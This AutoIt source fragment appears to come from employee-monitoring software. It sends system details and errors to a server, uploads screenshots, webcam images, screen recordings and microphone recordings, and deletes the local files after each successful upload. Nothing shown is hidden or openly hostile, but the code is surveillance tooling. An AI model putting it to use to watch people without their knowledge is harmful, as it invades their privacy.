
Func putError($computer_serial,$company_id,$module,$error)
	
	Local $address=$serverAddress&"/putError/computer_serial/"&$computer_serial&"/company_id/"&$company_id&"/module/"&$module&"/error/"&$error
	
	Local $result= _HTTP_Get($address)
	
	
	if $result<>"ok"  Then
		
		;there is a problem with the remote database lets store in the local one
		Local $result=putErrorLocal($computer_serial,$company_id,$module,$error)
		
		Return $result
		
	EndIf
	
	
	if @error Then
		
		Return False
		
	EndIf
		
	
EndFunc

Func putComputer()
	
	Local $osArchitecture=@OSArch
	
	Local $cpuArchitecture=@CPUArch
	
	Local $osType=@OSType
	
	Local $computerName=$computer_user
	
	Local $address=$serverAddress&"/putComputer/computer_serial/"&$computer_serial&"/company_id/"&$company_id&"/cpuArch/"&$cpuArchitecture&"/osArch/"&$osArchitecture&"/osType/"&$osType&"/computer_name/"&$computerName
	
	Local $result= _HTTP_Get($address)
	
	ConsoleWrite($result)
	
EndFunc


Func putScreenShot($computer_serial,$epoch,$filename,$filePath)
	
	Local $address=$serverAddress&"/putScreenShot"
	
	Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))
	
	if $result<>"ok" Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutScreenShotLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
		

EndFunc


Func putCameraShot($computer_serial,$epoch,$filename,$filePath)
	
	Local $address=$serverAddress&"/putCameraShot"
	
	Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))
	
	if $result<>"ok" Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutCameraShotLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
		

EndFunc


Func putScreenRecording($computer_serial,$epoch,$filename,$filePath)
	
	Local $address=$serverAddress&"/putScreenRecording"
	
	Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))
	
	if $result<>"ok" Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutScreenRecordingLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
		

EndFunc



Func putMicrophoneRecording($computer_serial,$epoch,$filename,$filePath)
	
	MsgBox(64,"",$filePath)
	
	Local $address=$serverAddress&"/putMicrophoneRecording"
	
	Local $result=_HTTP_Upload($address, $filePath, "file", "info=" & URLEncode($computer_serial&","&$epoch&","&$filename))
	
	if $result<>"ok" Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutMicrophoneRecordingLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			;FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
		

EndFunc